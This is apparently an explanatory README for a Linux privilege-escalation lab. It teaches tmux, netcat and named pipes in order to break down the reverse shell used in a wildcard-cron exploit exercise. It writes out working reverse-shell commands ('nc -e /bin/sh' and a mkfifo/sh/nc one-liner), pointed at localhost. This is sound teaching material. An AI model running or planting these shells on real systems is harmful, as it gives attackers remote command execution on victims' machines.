# Explaining the reverse shell in 5.wildcard-cron

## Tmux

To practice in the docker you need two active sheels. You can use `tmux` for this, which is already preinstalled.
```sh
tmux
```
You will a new shell and you can split the window into two shells. To do that you need to use the `prefix` commands while in `tmux`.
You can find more information [here](https://www.redhat.com/sysadmin/introduction-tmux-linux).
```sh
# Press Ctrl + B
# This activates the prefix
# press % (a.k.a Shift + 5)
# Now you have two shells
# To move between the shells press Ctrl + B followed by left or right arrow.
```

## Netcat
To run netcat within tmux go to the left shell and type:
```sh
# Listen on port 9000
nc -lvnp 9000
```

In the right shell type:
```sh
# Connect to port 9000
nc 127.0.0.1 9000
```

Now you can send text between the listener and the client.

## Reverse Shell
The simplest form of reverse shell you can get in linux and windows is using `netcat` (`nc` command). More information regarding this can be found [here](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/).

In linux there are two variants, regular and OpenBSD. Depending on the variant and version, you could use the `-e` flag which passes text to another command (in our case that would be a shell).

Assuming we fire up a `netcat` listener.
```sh
# Listen on port 9000
nc -lvnp 9000
```

We can make the client pass every text it receives to a program of our choice (sh) and get the program's output and send it to the listener. Type:
```sh
# Connect to port 9000
nc -e /bin/sh 127.0.0.1 9000
```

In this sense, the listener can send text to client the client sends the text to `/bin/sh` where it is executed as command and the output is sent back to the listener. This is essentially a reverse shell.

## 5.wildcard-cron

In the file `/home/user/5.wildcard-cron/exploit-tarcron.sh` the file `poc.sh` created by the script has the following command inside:
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f
```

An equivalent command would be:
```sh
nc -e /bin/sh 127.0.0.1 9000
```
given that our `netcat` version supports the `-e` argument.

### How it works

To understand the command
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f
```
we need to introduce a concept in linux and other operating systems called `pipes`. You can find more information about pipes [here](https://opensource.com/article/18/8/introduction-pipes-linux).

There are two kind of pipes:
1. Unnamed pipes
2. Named pipes

and both are used for the same concept: passing input/arguments to another program.

#### Unnamed pipes

You probably have used unnamed pipes before. They are symbolized with `|`.

Example: You want to check if a file contains the word `printf` a common tool for this is grep. You could run something like:
```sh
cat /home/user/1.suid-sgid/src/c-with-suid.c | grep "printf"
```

What this command does is to print the file contents using `cat` and then pass the output to `grep` which will print the line if it matches with the search term (printf in this case).

You can do more elaborate things with unnamed pipes like getting the users sorted from `/etc/passwd`:
```sh
# Print the passwd file
# Pass it to awk, which takes the first occurence after spliting each line by :
# Sort the result 
cat /etc/passwd | awk -F ':' '{print $1}' | sort
```

#### Named pipes
Named pipes are exactly like unnamed pipes, but can be created as special files using the command `mkfifo`. You can think of them as `queues` where you can put some text in them and the text can be consumed by another program, at a different time. In this sense a text is passed to another program, hence the term pipe.

Note that the text can be consumed only once and the pipes are not meant to store data like files.

Here is an example. On the first `tmux` shell type:
```sh
mkfifo /tmp/my_pipe
echo "Some text" >> /tmp/my_pipe
# This will put Some text to the pipe and block until the text is consumed
```

On the second `tmux` shell type:
```sh
tail -f /tmp/my_pipe
# This monitors the last lines of a file or pipe and where the is new data it will print it and wait.
```

The moment you run the `tail` command you will see the "Some text" data sent from the first `tmux` shell. At this point the data is consumed, removed from the `queue`/`fifo`.

You can continue adding data to the pipe by going to the first `tmux` shell and add more text there.

```sh
echo "Some text2" >> /tmp/my_pipe
echo "Some text4" >> /tmp/my_pipe
echo "Some text5" >> /tmp/my_pipe
```

#### Named pipe with reverse shell
The idea using the named pipe for a reverse shell is simple. Unnamed pipes are not enough, but we can combine them with name pipes to achieve the following flow:

1. `Netcat` listener listens on port `9000`.
2. `Netcat` client connects to the listener on `9000`.
3. The listener sends the command `whoami` to the client.
4. The client sends this command to the named pipe.
5. The pipe is configured so that `/bin/sh` receives data from it as input using an unnamed pipe. It gets the command from the pipe, runs it and uses an unnamed pipe again to send it back to netcat client which sends it back to the listener.

Let us break down the command now:
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f
```
can be writen line by line as
```sh
# If there is a file named /tmp/f, remove it
rm -f /tmp/f
# Create the named pipe /tmp/f
mkfifo /tmp/f
# Here is where th magic happens (see below).
cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f
```

Let us break apart the last command now:
- `cat /tmp/f|/usr/bin/sh -i 2>&1`
  - send the output of the unnamed pipe f to `/usr/bin/sh` run as an interactive shell (`-i` argument).
  - `2>&1` Means redirect stderr (2 fd) stdout (1 fd).
    - This is useful if you want to receive errors the shell gives you such as "Not found".
    - Usually shells print errors to stderr instead of stdout.
- `|nc 127.0.0.1 9000`
  - Connect to localhost, port `9000`.
  - use an unnamed pipe to send the stdout of `/usr/bin/sh` (which now also includes stderr) to `netcat`.
- Until this point we have set up the the shell so that it reads from the named pipe `/tmp/f` execute the command using `/usr/bin/sh` and send the output to the `netcat` client.
- `>/tmp/f`
  - Take whatever netcat receives and send it to the named pipe `/tmp/f`.
  - Note that the named pipe was hooked in `/usr/bin/sh`.
  - This looks like a circular piping, which is why you cannot just use named pipes, since you have to pipe to the `/usr/bin/sh` which started "before" starting `netcat`.